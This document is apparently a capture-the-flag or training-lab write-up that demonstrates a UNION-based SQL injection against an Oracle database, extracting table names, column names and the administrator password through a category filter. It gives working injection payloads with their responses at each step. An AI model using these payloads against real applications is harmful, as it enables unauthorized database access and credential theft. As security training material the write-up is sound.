# SQL injection, listing the database contents on Oracle

### Goal:
`Log in to the application as the administrator user`
### Info: The injection point is the product category filter
`target.com/filter?category=<input>`
### Info: The target is using a Oracle database
### Note: Table names, column names, and the password contain randomized characters. If the lab for any reason, these names will be regenerated.
<br><br>

**<ins>Step 1: Test injection point</ins>**

category='

`500: server error`<br><br>

category='--

`200`
<br><br>

**<ins>Step 2: Enumerate data output with UNION attack</ins>**

category='UNION SELECT NULL FROM DUAL--

`500 server error`<br><br>

category='UNION SELECT NULL,NULL FROM DUAL--

`200`

This means that the query outputs two values
<br><br>

category='UNION SELECT 'a','b' FROM DUAL--

`200`

This means that both values are strings. Knowing this, we can use either to output the desired data.<br><br>

**<ins>Step 3: Enumerate database with UNION attack</ins>**

category='UNION SELECT banner,NULL FROM v$version--

`Oracle Database 11g Express Edition Release 11.2.0.2.0`

We already knew the database was Oracle, but it is good practice to check the database version in case it is outdated.<br><br>

 **<ins>Step 4: Enumerate database structure with UNION attack</ins>**

 category='UNION SELECT table_name,NULL from all_tables--

 `USERS_XXXXXX`

This table likely contains the information we're looking for, so we'll look at its columns.<br><br>

category='UNION SELECT column_name,NULL from all_tab_columns WHERE table_name='USERS_XXXXXX'--

`USERNAME_XXXXXX, PASSWORD_XXXXXX`

This is the data we need!<br><br>

**<ins>Step 5: Exfiltrate the data</ins>**

category='UNION SELECT PASSWORD_XXXXXX,NULL FROM USERS_XXXXXX WHERE USERNAME_XXXXXX='administrator'--

`<password>`

Using this password with the username administrator will successfully log us in as the admin.
